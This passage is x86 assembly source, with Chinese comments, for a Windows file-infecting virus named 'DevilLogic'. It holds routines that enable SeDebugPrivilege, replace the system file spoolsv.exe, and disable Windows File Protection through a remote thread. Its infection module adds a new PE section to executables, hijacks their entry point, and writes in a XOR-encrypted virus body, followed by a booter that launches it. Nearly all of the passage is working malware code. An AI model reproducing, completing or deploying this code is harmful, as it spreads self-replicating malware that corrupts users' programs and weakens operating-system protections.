CloseHandle_GetPidFromProcessName:
	cmp dword ptr [ebp-hProcessSnap], INVALID_HANDLE_VALUE
	jz Error_GetPidFromProcessName
	push eax
	push dword ptr [ebp-hProcessSnap]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCloseHandle]
	pop eax	
Exit_GetPidFromProcessName:	
	mov esp, ebp
	pop ebp
	ret
EndGetPidFromProcessName:
;======================
;从进程ID获取进程所属用户名字
GetProcessUserName:			;第一个参数为进程ID;第二个为用户缓冲,第三个为域名缓冲
	push ebp
	mov ebp, esp
	sub esp, GetProcessUserNameStackSize
	mov eax, dword ptr [ebp]
	mov dword ptr [ebp-DevilLogicBaseEbp], eax
	mov eax, dword ptr [ebp+08h]
	mov dword ptr [ebp-pId1], eax
	mov eax, dword ptr [ebp+0Ch]
	mov dword ptr [ebp-szAccountName], eax
	mov eax, dword ptr [ebp+10h]
	mov dword ptr [ebp-szDomainName], eax
	
	mov eax, ACCOUNTDOMAINSIZE
	mov dword ptr [ebp-dwDomainName], eax
	mov dword ptr [ebp-dwAccountName], eax
	
	push dword ptr [ebp-pId1]
	push 0
	push PROCESS_QUERY_INFORMATION
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xOpenProcess]
	mov dword ptr [ebp-hRemoteProcess1], eax
	lea eax, [ebp-hAccessToken1]
	push eax
	push TOKEN_QUERY
	push dword ptr [ebp-hRemoteProcess1]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xOpenProcessToken]
	lea eax, [ebp-dwInfoBufferSize]
	push eax
	push INFOBUFFER
	lea esi, [ebp-InfoBuf]
	push esi
	push 1
	push dword ptr [ebp-hAccessToken1]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xGetTokenInformation]
	lea eax, [ebp-snu]
	push eax
	lea eax, [ebp-dwDomainName]
	push eax
	push dword ptr [ebp-szDomainName]
	lea eax, [ebp-dwAccountName]
	push eax
	push dword ptr [ebp-szAccountName]
	push dword ptr [esi.User.Sid]
	push 0
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xLookupAccountSidA]
	mov esp, ebp
	pop ebp
	ret
EndGetProcessUserName:
;======================
EndReliveThread:
;======================
;提升本地进程权限
UpgradePopedomProcess:
	push ebp
	mov ebp, esp
	sub esp, UpgradePopedomProcessStackSize
	mov eax, dword ptr [ebp]
	mov dword ptr [ebp-DevilLogicBaseEbp], eax
	lea eax, [ebp-hToken1]
	push eax
	push TOKEN_ADJUST_PRIVILEGES + TOKEN_QUERY
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xGetCurrentProcess]
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xOpenProcessToken]
	lea esi, [ebp-tp1]
	mov eax, 1
	mov dword ptr [esi.PrivilegeCount], eax
	push dword ptr [esi.PrivilegeCount]
	lea eax, [esi.Privileges[0].Luid]
	push eax
	call PushUUPSE_DEBUG_NAMEStr
			db	'SeDebugPrivilege',0
	PushUUPSE_DEBUG_NAMEStr:
	push 0
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xLookupPrivilegeValueA]
	mov eax, SE_PRIVILEGE_ENABLED
	mov dword ptr [esi.Privileges[0].Attributes], eax
	push 0
	push 0
	push size TOKEN_PRIVILEGES
	push esi
	push 0
	push dword ptr [ebp-hToken1]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xAdjustTokenPrivileges]
	push dword ptr [ebp-hToken1]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCloseHandle]
	mov esp, ebp
	pop ebp
	ret
EndUpgradePopedomProcess:
;======================
;替换系统文件
ReplaceSystemFile:
	push ebp
	mov ebp, esp
	sub esp, ReplaceSystemFileStackSize
	mov eax, dword ptr [ebp]
	mov dword ptr [ebp-DevilLogicBaseEbp],eax
	;获取系统目录
	push SystemDirectorySize
	lea eax, [ebp-szSystemDirectory]
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xGetSystemDirectoryA]
	;获取winlogon路径
	lea eax, [ebp-szSystemDirectory]
	push eax
	lea eax, [ebp-szFileNamePath]
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xlstrcpyA]
	call PushInfectFileNameStr1
			db	'\spoolsv.exe',0
	PushInfectFileNameStr1:
	lea eax, [ebp-szFileNamePath]
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xlstrcatA]
	;获取tmp路径
	lea eax, [ebp-szSystemDirectory]
	push eax
	lea eax, [ebp-szTmpFilePath]
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xlstrcpyA]
	call PushTmpStr1
			db	'\_@2006.tmp',0
	PushTmpStr1:
	lea eax, [ebp-szTmpFilePath]
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xlstrcatA]
	;将winlogon移动到_@2006.tmp 逻辑上为删除正在运行的文件
	push 1
	lea eax, [ebp-szTmpFilePath]
	push eax
	lea eax, [ebp-szFileNamePath]
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xMoveFileExA]
	;复制winlogon  这里生成的winglogon可以进行感染
	push FALSE
	lea eax, [ebp-szFileNamePath]
	push eax	
	lea eax, [ebp-szTmpFilePath]
	push eax	
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCopyFileA]
	;启动后删除_@2006.tmp
	push 4
	push 0
	lea eax, [ebp-szTmpFilePath]
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xMoveFileExA]
	mov esp, ebp
	pop ebp
	ret
EndReplaceSystemFile:
;======================
;去掉系统文件保护
RemoveSystemProtect:		;第一个参数为所取进程的进程ID		
	push ebp
	mov ebp, esp
	sub esp, RemoveSystemProtectStackSize
	mov eax, dword ptr [ebp]
	mov dword ptr [ebp-DevilLogicBaseEbp], eax
	mov eax, dword ptr [ebp+08h]
	mov dword ptr [ebp-pId2], eax
	push eax
	push 0
	push PROCESS_ALL_ACCESS
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xOpenProcess]
	mov dword ptr [ebp-hHandle1], eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xGetVersion]
	cmp al, 5
	jnz Error_RemoveSysProtect
	xor ecx, ecx
	mov cl, ah
	test cl, cl
	jnz IsWindowsXp
IsWindows2k:
	call PushSfcDllStr
			db	'sfc.dll',0
	PushSfcDllStr:
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xLoadLibraryA]
	mov dword ptr [ebp-hSfc], eax
	jmp short GetClearSysPAddr
IsWindowsXp:
	call PushSfc_OSDllStr
			db	'sfc_os.dll',0
	PushSfc_OSDllStr:
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xLoadLibraryA]
	mov dword ptr [ebp-hSfc], eax
	push 2
GetClearSysPAddr:	
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xGetProcAddress]
	test eax, eax
	jz Error_RemoveSysProtect
	mov dword ptr [ebp-CloseEvents], eax							
	push dword ptr [ebp-hSfc]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xFreeLibrary]
	lea eax, [ebp-pId2]
	push eax
	push 0
	push 0
	push dword ptr [ebp-CloseEvents]
	push 0
	push 0
	push dword ptr [ebp-hHandle1]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCreateRemoteThread]
	test eax, eax
	jz Error_RemoveSysProtect
	mov dword ptr [ebp-hThread3], eax
	push 0FA0h
	push dword ptr [ebp-hThread3]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xWaitForSingleObject]
	push dword ptr [ebp-hThread3]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCloseHandle]
	push dword ptr [ebp-hHandle1]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCloseHandle]
Error_RemoveSysProtect:	
	mov esp, ebp
	pop ebp
	ret
EndRemoveSystemProtect:
;======================
;感染模块	
Infect:
	push ebp
	mov ebp, esp
	sub esp, InfectStackSize
;======================
	mov eax, dword ptr [ebp]
	mov dword ptr [ebp-DevilLogicBaseEbp], eax
	mov eax, dword ptr [ebp+08h]
	mov dword ptr [ebp-szTargetName], eax
	;打开文件
	xor eax, eax
	push eax
	push eax
	push OPEN_EXISTING
	push eax
	push eax
	push GENERIC_READ+GENERIC_WRITE
	push dword ptr [ebp-szTargetName]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCreateFileA]
	inc eax
	je Error_Infect
	dec eax
	mov [ebp-hTargetFile], eax
	;取得文件大小
	lea eax, [ebp-InfectStackSize]
	push eax
	push dword ptr [ebp-hTargetFile]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xGetFileSize]
	inc eax
	je FileClose_Infect
	dec eax
	mov dword ptr [ebp-nTargetSize], eax
	;建立文件内存映射
	xchg eax, ecx
	add ecx, 2000h		;文件大小增加4096bytes
	xor ebx, ebx
	push ebx
	push ecx
	push ebx
	push PAGE_READWRITE
	push ebx
	push dword ptr [ebp-hTargetFile]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCreateFileMappingA]
	test eax, eax
	je FileClose_Infect
	mov dword ptr [ebp-hTargetMap], eax
	;影射内存
	xor ebx, ebx
	push ebx
	push ebx
	push ebx
	push FILE_MAP_WRITE
	push eax
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xMapViewOfFile]
	test eax, eax
	je MapClose_Infect
	mov dword ptr [ebp-pTargetMem], eax
	;修改PE文件
	xchg eax, esi
	;================================
	;判断是否在Booter里还是感染文件中
	mov eax, offset StartVirus - offset InBooter
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	sub ebx, eax	;ebx中为判断变量
	xor al, al
	cmp byte ptr [ebx], al
	jnz ReInfect	;如果不为零便跳到重复感染代码段
	;================================
	;重新写入Booter标志位
	inc al
	mov byte ptr [ebx], al
	;================================	
	;eax为在内存映射文件中的开始地址,它指向文件的开始位置
	cmp word ptr [esi], 'ZM'
	jne CouldNotInfect
	;判断感染标志为是否存在,如不存在感染,如果存在则放弃感染
	cmp byte ptr [esi+InfectTarget], InfectSign
	jnz ItCanInfect	
	;获取在Booter中的处理代码地址
	mov eax, offset DeleteSelfAndDelete - offset StartVirus
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	add ebx, eax
	mov dword ptr [ebp-OldEip], ebx	
	jmp CouldNotInfect
	;如果不存在则写入
ItCanInfect:	
	mov byte ptr [esi+InfectTarget], InfectSign	
	add esi, [esi+PEHeaderOffset]	;指向PE_HEADER
	cmp word ptr [esi], 'EP'
	jne CouldNotInfect	
	mov dword ptr [ebp-PeHeader], esi
	mov ecx, dword ptr [esi.NumberOfRvaAndSizes]
	imul ecx, ecx, 8		;ecx为目录总大小
	lea eax, [ecx+esi.DataDirectory]	;eax指向节表
	movzx ecx, word ptr [esi.NumberOfSections]
	imul ecx, ecx, SECTIONSIZE	;得到所有节大小
	add eax, ecx				;eax为节末尾
	xchg eax, esi				;eax为PE Header
	;添加一个新节
	mov dword ptr [esi], 'riv.'
	mov dword ptr [esi.VirtualSize], DevilLogicSize
	;计算VirtualSize和V.addr
	mov ebx, dword ptr [eax.SectionAlignment]	;节对齐
	mov dword ptr [ebp-SecAlign], ebx
	mov edi, dword ptr [eax.FileAlignment]		;文件对齐
	mov dword ptr [ebp-FileAlign], edi
		
	mov edx, esi
	sub edx, SECTIONSIZE
	mov ecx, [edx.VirtualAddress_Section_Header]	;上一节的V.addr
	mov eax, [edx.VirtualSize]						;上一节的实际大小
	xor edx, edx
	div ebx											;除以节对齐
	test edx, edx
	je Tmp1_Infect			
	inc eax
Tmp1_Infect:
	mul ebx						;上一节在内存中的对齐后的节大小
	add eax, ecx				;加上上一节的V.addr就是新节的开始V.addr
	mov dword ptr [esi.VirtualAddress_Section_Header], eax	;保存病毒节的偏移RVA
	mov dword ptr [ebp-NewEip], eax
	mov dword ptr [esi.Characteristics_Section_Header], 0E0000020h
	mov eax, DevilLogicSize		;计算SizeOfRawData的大小
	cdq
	div edi						
	je Tmp2_Infect				;计算本节的文件对齐
	inc eax
Tmp2_Infect:
	mul edi
	mov dword ptr [esi.SizeOfRawData], eax	;保存节对齐后的大小
	mov edx, esi
	sub edx, SECTIONSIZE
	mov eax, dword ptr [edx.PointerToRawData]
	add eax, dword ptr [edx.SizeOfRawData]
	
	mov dword ptr [esi.PointerToRawData], eax	;PointerToRawData更新
	mov dword ptr [ebp-OldEnd], eax	;病毒代码往Host文件中写入点
	mov eax, dword ptr [ebp-PeHeader]
	inc word ptr [eax.NumberOfSections]	;更新节数目
	mov ebx, dword ptr [eax.AddressOfEntryPoint]
	mov dword ptr [ebp-OldEip], ebx	;保存老指针
	mov ebx, dword ptr [eax.ImageBase]
	mov dword ptr [ebp-FileImageBase], ebx		;保存文件加载地址
	mov ebx, dword ptr [ebp-NewEip]
	mov dword ptr [eax.AddressOfEntryPoint], ebx	;更新新指针
	mov ebx, dword ptr [eax.SizeOfImage]
	add ebx, DevilLogicSize
	mov ecx, dword ptr [ebp-SecAlign]
	xor edx, edx
	xchg eax, ebx
	cdq
	div ecx
	test edx, edx
	je Tmp3_Infect
	inc eax
Tmp3_Infect:
	mul ecx
	xchg eax, ebx	;还原eax->Pe Header
	mov dword ptr [eax.SizeOfImage], ebx
	;写入文件加载地址
	mov eax, offset StartVirus - offset ImageBaseAddr
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	sub ebx, eax
	mov eax, dword ptr [ebp-FileImageBase]
	mov dword ptr [ebx], eax
	;写入口点地址
	mov eax, offset StartVirus - offset NormalEntry
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	sub ebx, eax	;ebx中为宿主入口点记录地址
	mov eax, dword ptr [ebp-OldEip]
	mov dword ptr [ebx], eax
	;写入Host文件入口节点的位置记录到DevilLogic身体内
	mov eax, offset StartVirus - offset DevilLogicPRD
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	sub ebx, eax	;ebx中为Host入口点位置地址
	mov eax, dword ptr [ebp-OldEnd]
	mov dword ptr [ebx], eax
	;获取在Booter中的处理代码地址
	mov eax, offset DeleteSelfAndDelete - offset StartVirus
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	add ebx, eax
	mov dword ptr [ebp-OldEip], ebx
	;随机生成密码
	push dword ptr [ebp-DevilLogicBaseEbp]
	push 0FFh
	push 01h
	call GetRand
	mov dword ptr [ebp-szTargetName], eax		;临时存储密码
	add esp, 0Ch
	;写入新密码到DevilLogic的密码位置地址
	mov eax, offset StartVirus - offset KeyCode
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	sub ebx, eax		;ebx为密码位置地址
	mov eax, dword ptr [ebp-szTargetName]		;还原密码
	mov byte ptr [ebx], al
	;写入解密头
	mov ecx, StartHeadSize
	mov edi, [ebp-OldEnd]
	add edi, dword ptr [ebp-pTargetMem]
	;定位DevilLogic的位置
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	mov eax, dword ptr [eax-Eip]
	mov ebx, offset StartVirus - offset DevilLogic
	sub eax, ebx				;eax为DevilLogic的地址
	mov esi, eax
	cld
	rep movsb
	;写入加密后的病毒执行体
	mov edx, dword ptr [ebp-szTargetName]
	cld
	mov ecx, VirusSize
LoopWriteVirusToFile:	
	lodsb
	xor al, dl
	stosb
	loop LoopWriteVirusToFile
	;感染过后替换高速缓冲文件夹中的spoolsv.exe文件
	;push dword ptr [ebp-DevilLogicBaseEbp]
	;call ReplaceDllCache
	;add esp, 04h
	jmp SetFileToTail			;跳到设置文件末尾
ReInfect:
	;当在宿主文件中的时候,跳到这里继续执行
	;esi为PE文件内存地址		
	;更新密码, 更新StartVirus 到 EndVirus
	;定位病毒节在文件内存映射中的位置
	;取出宿主文件入口点
	mov eax, offset StartVirus - offset DevilLogicPRD
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	sub ebx, eax				;ebx为DevilLogicPRD的位置地址
	mov eax, dword ptr [ebp-pTargetMem]
	add eax, dword ptr [ebx]	;eax中为宿主文件DeviLogic节在内存映射中的地址
	;定位到StartVirus位置
	mov ebx, offset StartVirus - offset DevilLogic
	add eax, ebx				;eax为StartVirus的地址
	mov edi, eax				;保存加密开始指针
	;获取一个新的密码
	push dword ptr [ebp-DevilLogicBaseEbp]
	push 0FFh
	push 01h
	call GetRand
	add esp, 0Ch
	mov dword ptr [ebp-szTargetName], eax	;保存密码
	;定位文件映射中的位置
	mov eax, offset StartVirus - offset KeyCode
	mov ebx, edi
	sub ebx, eax				;ebx为加密中的密码		
	mov eax, dword ptr [ebp-szTargetName]
	mov byte ptr [ebx], al
	mov dl, al
	;将StartVirus 到 EndVirus重写
	mov esi, dword ptr [ebp-DevilLogicBaseEbp]
	mov esi, dword ptr [esi-Eip]
	mov ecx, VirusSize
	cld
ReEnCodeVirus:
	lodsb
	xor al, dl
	stosb
	loop ReEnCodeVirus
	;取出入口点地址并赋予栈内
	mov eax, offset StartVirus - offset NormalEntry
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	sub ebx, eax
	mov eax, dword ptr [ebx]
	mov dword ptr [ebp-OldEip], eax
	mov eax, offset StartVirus - offset ImageBaseAddr
	mov ebx, dword ptr [ebp-DevilLogicBaseEbp]
	mov ebx, dword ptr [ebx-Eip]
	sub ebx, eax
	mov eax, dword ptr [ebx]
	add eax, dword ptr [ebp-OldEip]
	mov dword ptr [ebp-OldEip], eax
SetFileToTail:			
	;设置文件指针到末尾
	xor eax, eax
	sub edi, [ebp-pTargetMem]
	push FILE_BEGIN
	push eax
	push edi
	push dword ptr [ebp-hTargetFile]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xSetFilePointer]
	push dword ptr [ebp-hTargetFile]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xSetEndOfFile]
;======================
UnView_Infect:
	push dword ptr [ebp-pTargetMem]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xUnmapViewOfFile]
MapClose_Infect:
	push dword ptr [ebp-hTargetMap]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCloseHandle]
FileClose_Infect:
	push dword ptr [ebp-hTargetFile]
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xCloseHandle]
CouldNotInfect:	
Error_Infect:
	mov eax, dword ptr [ebp-OldEip]
	mov esp, ebp
	pop ebp
	ret
EndInfect:
;======================
;取得随机数
GetRand:				;第三个参数为病毒ebp的基址
	push ebp
	mov ebp, esp
	sub esp, GetRandStackSize
	push edx
	push ecx
	
	mov eax, dword ptr [ebp+10h]
	mov dword ptr [ebp-DevilLogicBaseEbp], eax
	mov eax, dword ptr [ebp+08h]
	mov dword ptr [ebp-GetRandMin], eax
	mov eax, dword ptr [ebp+0Ch]
	mov dword ptr [ebp-GetRandMax], eax
	
	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
	call dword ptr [eax-xGetTickCount]
	mov ecx, 29h
	mul ecx
	add eax, 07h
	mov ecx, dword ptr [ebp-GetRandMax]
	sub ecx, dword ptr [ebp-GetRandMin]
	inc ecx
	xor edx, edx
	div ecx
	add edx, dword ptr [ebp-GetRandMin]
	mov eax, edx
	
	pop ecx
	pop edx
	mov esp, ebp
	pop ebp
	ret
EndGetRand:
;======================
EndVirus:
;======================
ExitProcessAddr:
		dd	?
EndDevilLogic:
;======================
.code
;病毒载体
szDllKernel32	db	'kernel32.dll',0
szVirtualAlloc	db	'VirtualAlloc',0
Booter:
	;开辟执行内存并加密病毒体代码,为了可以进行加密而设计...
	call VirtualAlloc, 0, VirusSize, 3000h, 40h
	mov edx, eax			;保存进入地址
	;写入DevilLogic到执行堆
	mov edi, eax
	mov esi, offset DevilLogic
	mov ecx, DevilLogicSize
	cld
	rep movsb
	;加密病毒体部分
	add eax, offset StartVirus - offset DevilLogic	;指向病毒体部分
	mov edi, eax
	mov esi, offset StartVirus
	mov ecx, VirusSize
	;取得一个随机数
	call GetRandMain, 01h, 0FFh
	add esp, 08h		;清除参数栈
	mov ebx, eax		;ebx中为加密密钥	
	cld
EnCodeLoop:
	lodsb
	xor al, bl
	stosb
	loop EnCodeLoop	
	;将密钥写入病毒体
	mov ecx, KeyCodeOffset
	add ecx, edx
	mov byte ptr [ecx], bl
	push edx		;保存进入点
	;获取VirtualAlloc地址并写入病毒体
	call LoadLibraryA, offset szDllKernel32
	call GetProcAddress, eax, offset szVirtualAlloc
	mov ebx, VirtualAllocOffset
	pop edx
	add ebx, edx
	mov dword ptr [ebx], eax
	;执行病毒体
	call edx
	;自删除
	;退出
	call ExitProcess, 0
;======================
GetRandMain:
	push ebp
	mov ebp, esp
	sub esp, 10h
	push edx
	push ecx
	mov eax, dword ptr [ebp+08h]
	mov dword ptr [ebp-04h], eax
	mov eax, dword ptr [ebp+0Ch]
	mov dword ptr [ebp-08h], eax
	call GetTickCount
	mov ecx, 47h
	mul ecx
	add eax, 17h
	mov ecx, dword ptr [ebp-08h]
	sub ecx, dword ptr [ebp-04h]
	inc ecx
	xor edx, edx
	div ecx
	add edx, dword ptr [ebp-04h]
	mov eax, edx
	pop ecx
	pop edx
	mov esp, ebp
	pop ebp
	ret
EndGetRandMain:	
end Booter